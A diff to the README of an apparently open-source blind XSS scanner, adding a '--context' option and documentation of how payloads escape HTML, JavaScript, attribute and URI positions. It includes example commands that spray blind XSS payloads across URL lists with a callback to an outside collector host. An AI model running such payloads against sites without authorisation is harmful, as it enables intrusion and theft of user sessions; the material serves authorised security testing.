@@ -85,6 +85,7 @@ go install -v github.com/ethicalhackingplayground/bxss/v2/cmd/bxss@latest
 | `-rl float`   | Rate limit (requests per second)                         | `0`      |
 | `-f`          | Follow redirects                                         | `false`  |
 | `-l`          | Enable Trace Mode (experimental)                          | `false`  |
+| `--context`   | Injection context used to encode the callback: `html`, `js`, `attribute`, `uri` | `html`   |
 ---
 
 ## 🎬 Demonstration
@@ -179,6 +180,32 @@ echo uber.com \
 ```
 
 For advanced dorking and vulnerability exploration, check out [Dorki](https://dorki.attaxa.com/) and sign up today!
+
+---
+
+## 🧩 Injection Contexts (`--context`)
+
+The same callback breaks in different ways depending on where it lands. `--context` selects the encoding order; the callback itself is always parsed as a structured URL first, so scheme, host, port and query order round-trip exactly.
+
+| Context     | Use when the callback lands in…            | Encoding |
+| ----------- | ------------------------------------------ | -------- |
+| `html` (default) | Raw HTML text/markup                  | Identity — payload sent byte-for-byte, legacy tag injection unchanged |
+| `js`        | A `<script>` block or JS string            | Closes the string/script first, then JS-escapes and HTML entity-encodes the callback |
+| `attribute` | A quoted HTML attribute                    | Breaks out with a quote and binds an event handler; `&` becomes `&amp;`, never percent-encoded twice |
+| `uri`       | A navigable `href`/`src` position          | Emits a percent-encoded `javascript:` URI; the callback is a JS string argument, not a query parameter |
+
+Invalid values fail loudly with the list of supported contexts instead of silently falling back:
+
+```bash
+# JS string / script block
+cat urls.txt | bxss --context js -p 'https://xss.report/c/username?a=1&b=2'
+
+# Quoted HTML attribute
+cat urls.txt | bxss --context attribute -p 'https://xss.report/c/username'
+
+# Navigable href/src
+cat urls.txt | bxss --context uri -p 'https://xss.report/c/username'
+```
 
 ---
 
